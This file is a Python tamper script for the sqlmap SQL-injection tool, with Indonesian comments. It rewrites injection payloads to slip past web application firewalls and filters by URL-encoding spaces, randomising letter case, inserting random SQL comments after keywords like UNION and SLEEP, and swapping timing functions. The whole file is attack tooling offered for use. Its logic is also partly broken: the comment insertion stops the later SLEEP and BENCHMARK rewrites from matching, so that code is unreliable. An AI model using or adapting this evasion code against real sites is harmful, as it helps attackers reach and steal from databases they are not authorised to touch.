from lib.core.enums import PRIORITY
import random
import re

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    if not payload:
        return payload

    # Ganti spasi dengan %20
    payload = payload.replace(" ", "%20")

    # Fungsi untuk mengacak case huruf
    def random_case(s):
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

    payload = random_case(payload)

    # Sisipkan komentar SQL acak untuk mengelabui filter
    comments = ["/*+*/", "/*xyz*/", "/*comment*/"]

    # Fungsi untuk menyisipkan komentar acak setelah kata kunci tertentu
    def insert_comment(match):
        word = match.group(0)
        comment = random.choice(comments)
        return word + comment

    # Sisipkan komentar setelah kata kunci umum
    for keyword in ["OR", "AND", "SELECT", "UNION", "ELT", "SLEEP", "BENCHMARK", "WHERE", "FROM"]:
        pattern = re.compile(r'\b' + keyword + r'\b', re.IGNORECASE)
        payload = pattern.sub(insert_comment, payload)

    # Modifikasi fungsi sleep dan benchmark agar sulit terdeteksi
    # Ganti SLEEP dengan pg_sleep atau sleep secara acak
    payload = re.sub(r'SLEEP\((\d+)\)', lambda m: random.choice([f"pg_sleep({m.group(1)})", f"sleep({m.group(1)})"]), payload, flags=re.IGNORECASE)

    # Ganti BENCHMARK dengan BENCHMARK disisipkan komentar
    payload = re.sub(r'BENCHMARK\(([^)]+)\)', lambda m: "BENCHMARK/*+*/(" + m.group(1) + ")", payload, flags=re.IGNORECASE)

    return payload
